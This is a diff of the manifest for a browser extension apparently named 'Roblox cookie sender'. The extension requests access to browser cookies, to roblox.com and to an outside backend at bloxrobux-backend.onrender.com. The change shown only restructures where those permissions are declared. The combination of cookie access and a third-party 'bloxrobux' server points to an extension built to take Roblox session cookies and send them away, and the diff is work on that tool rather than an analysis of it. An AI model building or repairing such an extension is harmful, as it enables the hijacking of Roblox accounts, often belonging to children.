@@ -3,12 +3,10 @@
   "name": "Envoyeur de cookies Roblox",
   "version": "1.0",
   "permissions": [
-  "cookies",
-  "notifications",
-  "activeTab",
-  "https://*.roblox.com/*",
-  "https://bloxrobux-backend.onrender.com/*"
-],
+    "cookies",
+    "notifications",
+    "activeTab"
+  ],
   "host_permissions": [
     "https://*.roblox.com/*",
     "https://bloxrobux-backend.onrender.com/*"
